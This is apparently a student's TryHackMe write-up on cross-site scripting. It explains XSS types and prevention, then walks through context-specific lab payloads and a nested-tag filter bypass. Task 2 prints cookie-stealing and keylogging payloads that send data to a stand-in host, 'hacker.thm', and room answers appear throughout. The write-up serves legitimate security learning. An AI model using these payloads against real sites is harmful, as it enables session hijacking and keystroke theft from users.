# TryHackMe — Intro to Cross-site Scripting (XSS)

## Task 2: XSS Payloads

### 1. What Is an XSS Payload?

An XSS payload is code designed to execute in a user's browser by exploiting a Cross-site Scripting vulnerability.

A payload has two parts:

- **Intention:** What the code is intended to do.
- **Modification:** How the code is adapted to the vulnerable context.

### 2. Proof of Concept (PoC)

**Full payload:**

```html
<script>alert('XSS');</script>
```

**Code breakdown:**

- `<script>` — Starts an HTML script element.
- `alert('XSS')` — Displays a popup containing `XSS`.
- `</script>` — Closes the script element.

**Purpose:** To demonstrate that JavaScript can execute in a webpage.

**Where to use:** An authorized XSS lab's vulnerable input field or URL parameter.

**How to test:**

1. Open the practice lab.
2. Find the input being tested.
3. Enter the payload and submit it.
4. Check whether a popup appears.
5. If it fails, inspect how the application processes the input.

The payload will not execute in every context. HTML encoding, filtering, and the location where the input is inserted can affect execution.

### 3. Session Stealing

**Full payload from the lesson:**

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Code breakdown:**

- `document.cookie` — Reads cookies accessible to JavaScript.
- `btoa()` — Encodes a string using Base64.
- `fetch()` — Sends an HTTP request.
- `?cookie=` — Adds a query parameter intended to carry the encoded value.

**Purpose:** Demonstrates how malicious JavaScript could transmit accessible cookie data.

**Important:** `HttpOnly` cookies cannot be read through `document.cookie`. Base64 is encoding, not encryption. Never send real session cookies to an external server.

### 4. Key Logger

**Full payload from the lesson:**

```javascript
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

**Code breakdown:**

- `document.onkeypress` — Assigns a keyboard-event handler.
- `function(e)` — Defines a function receiving the event.
- `e.key` — Identifies the key associated with the event.
- `btoa(e.key)` — Encodes the key in Base64.
- `fetch()` — Sends an HTTP request containing the encoded value.

**Purpose:** Demonstrates how injected JavaScript could capture keystrokes and transmit them.

**Safe testing:** Use a local demonstration that displays test keystrokes on your own page. Do not collect real passwords or monitor other users.

### 5. Business Logic

**Full example from the lesson:**

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Code breakdown:**

- `user` — Represents a JavaScript object.
- `changeEmail()` — Represents a method.
- `'attacker@hacker.thm'` — The argument passed to the method.

**Purpose:** Illustrates how XSS could invoke an application's functionality.

**Important:** This is a hypothetical example. The object and method must exist, and the application must allow the operation. Changing an email address could create further account-security risks.

### 6. Where Are XSS Payloads Used?

**A. Input fields**

Examples: Search boxes, comments, profile fields, and feedback forms.

Test by entering a harmless marker and observing how the application displays it.

**B. URL parameters**

Example:

```text
https://example.com/search?q=test
```

- `q` is the query parameter.
- `test` is its value.

If the application returns this value in an unsafe context, it may be vulnerable to Reflected XSS.

**C. Burp Suite Repeater**

1. Open the authorized lab in your browser.
2. Capture the HTTP request using Burp Suite Proxy.
3. Send the request to Repeater.
4. Locate the relevant input parameter.
5. Change it to a harmless test marker.
6. Send the request and inspect the response.
7. Check the context in which the input is returned.

An HTTP response alone does not always prove that JavaScript executed. Confirm the browser behavior when appropriate.

**D. Stored content**

Some applications save user input and display it later. If that content is rendered unsafely, Stored XSS may occur.

**E. DOM-based input**

Client-side JavaScript may process URL parameters, URL fragments, or other user-controlled values and insert them into the DOM unsafely.

### 7. Types of XSS

**Reflected XSS:** Request-controlled input is immediately returned in an unsafe context.

**Stored XSS:** Malicious input is saved and executes when the application later renders it unsafely.

**DOM-based XSS:** Client-side JavaScript processes untrusted input through an unsafe operation.

### 8. Basic XSS Testing Workflow

1. Identify a user-controlled input.
2. Submit a harmless marker, such as `XSS_TEST_123`.
3. Inspect the request and response.
4. Find where the marker appears.
5. Identify its HTML or JavaScript context.
6. Select an appropriate test for the authorized lab.
7. Check whether JavaScript actually executes.
8. Record the result and explain why the test succeeded or failed.

### 9. Important JavaScript Concepts

| Code | Meaning |
|---|---|
| `alert()` | Displays a browser popup |
| `document.cookie` | Reads JavaScript-accessible cookies |
| `btoa()` | Encodes a string in Base64 |
| `fetch()` | Makes an HTTP request |
| `e.key` | Provides the key associated with a keyboard event |
| `changeEmail()` | Illustrates calling a hypothetical method |
| `<script>` | HTML element used to embed JavaScript |

### 10. TryHackMe Answers

**Q1. Which document property could contain the user's session token?**

Answer: `document.cookie`

**Q2. Which JavaScript method is often used as a Proof Of Concept?**

Answer: `alert()`

### Key Takeaway

XSS occurs when untrusted input is handled in a way that allows unintended JavaScript execution in a user's browser. Successful testing requires understanding where the input enters, how it is processed, and where it appears in the page.





## Task 3: Reflected XSS

### 1. What Is Reflected XSS?

Reflected Cross-site Scripting occurs when user-controlled input from an HTTP request is included in a webpage without proper handling, potentially allowing unintended JavaScript execution.

### 2. Example URL

 <img width="418" height="49" alt="image" src="https://github.com/user-attachments/assets/690e591a-65f3-4b1b-bafb-5a19813e3320" />

 <img width="360" height="78" alt="image" src="https://github.com/user-attachments/assets/0d56cb22-52b3-4179-9bc7-83934e17460c" />

 
```text
https://example.com/error?error=Invalid
```

- `?` starts the query string.
- `error` is the query parameter.
- `Invalid` is the parameter value.

If the application inserts the value into the webpage unsafely, reflected XSS may be possible.

### 3. How Reflected XSS Works

1. An attacker crafts a URL containing manipulated input.
2. A victim visits the URL.
3. The application processes the input.
4. The input is reflected into the HTTP response.
5. If the browser interprets the input as executable code, XSS may occur.

<img width="609" height="47" alt="image" src="https://github.com/user-attachments/assets/63d8044d-4583-440e-8179-5d30c3ebd2a9" />

<img width="566" height="97" alt="image" src="https://github.com/user-attachments/assets/cca13262-2168-40be-85fd-f36e08f563a5" />

### 4. Where to Test

- **URL query string:** Query parameters such as `?error=Invalid`.
- **URL file path:** User-controlled path segments that may be reflected in the response.
- **HTTP headers:** Some header values may be reflected into a webpage.

### 5. Testing Methodology

1. Identify user-controlled URL parameters.
2. Submit a harmless marker such as `XSS_TEST_123`.
3. Check whether the marker appears in the response.
4. Inspect the HTTP request and response using Burp Suite.
5. Identify the HTML or JavaScript context in which the input appears.
6. Use an appropriate harmless PoC in an authorized lab.
7. Confirm whether JavaScript execution actually occurs.

### 6. Potential Impact

Depending on the application and browser context, reflected XSS may allow an attacker to execute JavaScript in a victim's browser. This could expose sensitive information or enable unauthorized actions.

### 7. Prevention

- Contextually encode untrusted output.
- Avoid inserting untrusted data through unsafe DOM operations.
- Validate inputs where appropriate.
- Use Content Security Policy (CSP) as an additional defensive layer.

### TryHackMe Answer

**Question:** Where in a URL is a good place to test for reflected XSS?

**Answer:** URL query string (query parameters).

### Key Takeaway

Reflected XSS involves request-controlled input being returned in an unsafe context. Finding reflected input is the first step; confirming executable JavaScript is necessary to establish the vulnerability.



## Task 5: DOM-Based XSS

### 1. What Is the DOM?
DOM stands for Document Object Model. It represents an HTML page as objects that JavaScript can access and modify.

### 2. What Is DOM-Based XSS?
DOM-Based XSS occurs when client-side JavaScript handles attacker-controlled input unsafely, potentially causing JavaScript execution in the browser.

<img width="486" height="266" alt="image" src="https://github.com/user-attachments/assets/16638df5-5d65-4728-a318-617d60f9fbf2" />

### 3. Example
```javascript
document.getElementById('output').innerHTML = window.location.hash;
```

- `window.location.hash` reads the URL fragment after `#`.
- `innerHTML` interprets a value as HTML.
- Unsafe handling of untrusted input may create an XSS vulnerability.

### 4. What to Look For
- Sources: `window.location`, `window.location.hash`, and other attacker-controlled inputs.
- Sinks: `innerHTML` and dangerous methods such as `eval()`.

### 5. Prevention
- Prefer `textContent` when inserting plain text.
- Avoid `eval()` with untrusted input.
- Use safe DOM APIs and context-appropriate output handling.

### TryHackMe Answer
**Question:** What unsafe JavaScript method is good to look for in source code?

**Answer:** `eval()`

### Key Takeaway
DOM-Based XSS occurs through unsafe client-side JavaScript handling of untrusted input.

## Task 6: Blind XSS

### 1. What Is Blind XSS?
Blind XSS is similar to Stored XSS. The payload is stored by the application, but the tester cannot directly see when or where it executes.

### 2. Example Scenario
1. A user submits a message through a contact form.
2. The application stores the message.
3. Staff view the message in a private support portal.
4. If the input is handled unsafely, JavaScript may execute in the staff member's browser.

### 3. How to Test
- Identify inputs that are stored and later viewed by other users.
- In an authorized lab, use a harmless test payload.
- Configure a controlled callback endpoint to detect execution.
- Check whether a callback request is received.

### 4. Potential Impact
Depending on the vulnerability and browser protections, Blind XSS may expose information or enable unauthorized actions in the affected user's session.

### 5. Testing Tool
**XSS Hunter Express:** A tool designed to help detect Blind XSS through callback-based testing.

Project: https://github.com/mandatoryprogrammer/xsshunter-express

### Prevention
- Encode untrusted data before displaying it.
- Sanitize HTML where appropriate.
- Avoid unsafe DOM operations.
- Apply security controls to internal staff portals as well as public pages.

### TryHackMe Answer
**Question:** What tool can you use to test for Blind XSS?

**Answer:** XSS Hunter Express

### Key Takeaway
Blind XSS requires a way to detect execution when the payload runs somewhere you cannot directly observe.


## Task 7: Perfecting Your Payload

### Objective
In this task, I practised adapting XSS payloads based on where my input was reflected in the webpage.

### Level 1: HTML Context

I entered my name into the input field and checked how the application displayed it. I then inspected the page source and found that my input was reflected in the HTML body.

<img width="342" height="261" alt="Screenshot 2026-10-10 190755" src="https://github.com/user-attachments/assets/d42ce0c5-4d80-492c-a310-709c8839c771" />

<img width="322" height="152" alt="Screenshot 2026-10-10 190834" src="https://github.com/user-attachments/assets/19c6a575-9f9b-4246-8b0b-59159f8935d9" />

I tested the following payload:

```html
<script>alert('THM');</script>
```
<img width="601" height="212" alt="Screenshot 2026-10-10 190858" src="https://github.com/user-attachments/assets/f88460ca-d339-44c5-95a0-cf0de90ce85e" />

<img width="550" height="240" alt="Screenshot 2026-10-10 190920" src="https://github.com/user-attachments/assets/9a943af8-5028-4587-8e29-b0815ea45a26" />

The browser displayed an alert containing `THM`, confirming JavaScript execution in this lab.



### Level 2: Input Attribute

I checked the page source and found that my input was placed inside the `value` attribute of an input element. The previous payload did not fit this context, so I tried closing the attribute and element first.

```html
"><script>alert('THM');</script>
```

The `">` attempts to close the quoted attribute and input element, allowing the script element to be parsed separately.

<img width="678" height="231" alt="image" src="https://github.com/user-attachments/assets/15270977-e61c-44d4-9936-d77da62ab0eb" />


<img width="482" height="345" alt="image" src="https://github.com/user-attachments/assets/d1e84bd7-80ab-4e33-9d1c-fd93b6a6b653" />


### Level 3: Textarea Context

In this level, my input was reflected inside a `textarea` element. I adapted the payload to close the element before adding the script.
text area look like this

```html
<textarea>Tasnim</textarea>
```
The Payload is:

```html
</textarea><script>alert('THM');</script>
```

The `</textarea>` closes the textarea element so the browser can parse the following markup separately.

<img width="970" height="312" alt="image" src="https://github.com/user-attachments/assets/4a4aa932-cfe4-4d8b-ba9e-36bc541ed61c" />


### Level 4: JavaScript Context

I inspected the page source and found that my input was reflected inside JavaScript code. 

<img width="668" height="97" alt="image" src="https://github.com/user-attachments/assets/199bd54b-5e9f-4f77-913f-2898c749cbe8" />

I used a payload designed for that string context.

```javascript
';alert('THM');//
```
<img width="750" height="207" alt="image" src="https://github.com/user-attachments/assets/ce6cbed9-c873-41be-8f03-6abd5cd47487" />

How the payload works:

' closes the existing single-quoted string.

; terminates the current JavaScript statement.

alert('THM') executes JavaScript and displays an alert.

// comments out the remaining code on the same line, helping prevent syntax errors.

### Level 5: Filter Bypass

My normal script payload did not work because the application filtered the word `script`. I inspected the reflected output and tested how the filter handled repeated text.

<img width="433" height="90" alt="image" src="https://github.com/user-attachments/assets/1e995f68-8bf6-4e53-b5b5-9a9b5d0ff163" />


```html
<sscriptcript>alert('THM');</sscriptcript>
```

<img width="517" height="222" alt="image" src="https://github.com/user-attachments/assets/115b816c-a6a8-43e2-bb31-4805ff6513f0" />

How it works:

The filter removes the matching script substring. 
The payload is constructed so that removing the inner substring can leave a valid <script> element.



### Level 6: Image Attribute Context

The application filtered the `<` and `>` characters, so I could not use the previous approach to insert a new HTML element. I inspected the reflected input and found that it was placed in an image attribute.

<img width="510" height="120" alt="image" src="https://github.com/user-attachments/assets/cc7effa4-f64f-4eb4-b34d-9aa0e293a8b6" />


I tested this lab-specific payload:

```html
/images/cat.jpg" onload="alert('THM');
```

<img width="1013" height="690" alt="image" src="https://github.com/user-attachments/assets/c31a2107-33c3-48e7-a64a-31fedfaee194" />

How it works:

/images/cat.jpg provides the image path.

" attempts to close the existing src attribute.

onload adds a JavaScript event handler that runs when the image loads successfully.

alert('THM') provides a visible indication of JavaScript execution.

Key takeaway: When HTML tag creation is blocked, investigate whether an existing HTML element's attributes can be influenced by user input.

### What I Learned

- I need to inspect where my input appears before choosing a payload.
- HTML body, attributes, textareas, and JavaScript strings require different approaches.
- Filters may behave differently depending on how they remove or encode characters.
- A payload that works in one context may fail in another.
- I should confirm JavaScript execution and keep screenshots as evidence.

### TryHackMe Answer

**Question:** What is the flag you received from Level 6?

**Answer:** 

